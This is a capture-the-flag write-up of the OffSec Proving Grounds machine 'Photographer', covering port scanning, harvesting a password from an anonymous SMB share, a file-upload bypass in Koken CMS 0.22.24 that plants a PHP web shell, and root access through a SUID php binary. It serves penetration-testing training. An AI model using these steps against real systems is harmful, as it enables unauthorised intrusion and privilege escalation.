---
title: "Proving grounds Play: Photographer"
layout: post
date: 2023-09-25 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 414daa1886948e88a74c6b426076f14f (RSA)
|   256 4da3d07a8f64ef82452d011318b7e013 (ECDSA)
|_  256 1a017a4fcf9585bf31a14f1587ab94e2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu)) Koken 0.22.24
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Koken 0.22.24
|_http-title: daisa ahomi
Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web PORT: 8000

![img](/assets/images/CTF/Proving_Grounds/Photographer/web1.png)

The meta data in the landing page `http://192.168.193.76:8000/` source revealed the CMS version.

```html
<meta name="generator" content="Koken 0.22.24" />
```
The version `Koken 0.22.24` is vulnerable to [Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)](https://www.exploit-db.com/exploits/48706).

### Directory Fuzzing

http://192.168.193.76:8000/admin/

![img](/assets/images/CTF/Proving_Grounds/Photographer/web2.png)

## SMB Share

Enumerate smb share.

```sh
naveenj@hackerspace:|22:56|~/pg-play/Photographer$ smbclient -L //192.168.193.76/ -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
```

Connect to SMB share.

```sh
naveenj@hackerspace:|22:56|~/pg-play/Photographer$ smbclient  //192.168.193.76/sambashare -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Aug 20 11:51:08 2020
  ..                                  D        0  Thu Aug 20 12:08:59 2020
  mailsent.txt                        N      503  Mon Jul 20 21:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 21:22:23 2020
```

Download mailsent.txt file and view to obtain the credentials for the admin portal.

```text
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

## Credentials

`daisa@photographer.com: babygirl`
Login to the koen admin portal.

## Initial Foothold

After login to the admin portal Direct to `Library - Content - Import Content`.

Create a php remote code execution code or a php reverse shell and save it as `image.php.jpg`. Use Burp Suite to intercept the image upload traffic and change the file name to `image.php`.

Once the file is uploaded click on the file and on the right side scroll down and click view option. Then hover over the image download button and click to trigger the reverse shell.

```text
http://192.168.193.76:8000/storage/originals/f2/10/image.php?cmd=id
```

![img](/assets/images/CTF/Proving_Grounds/Photographer/shell.png)

## Privilege Escalation

### SUID

Enumerate the SUIDs in the sysytem.

```sh
www-data@photographer:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2     #Exploitable
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su
www-data@photographer:/$
```

### GTFO Bins

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```sh
sudo install -m =xs $(which php) .

    CMD="/bin/sh"
    ./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

![img](/assets/images/CTF/Proving_Grounds/Photographer/root.png)

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).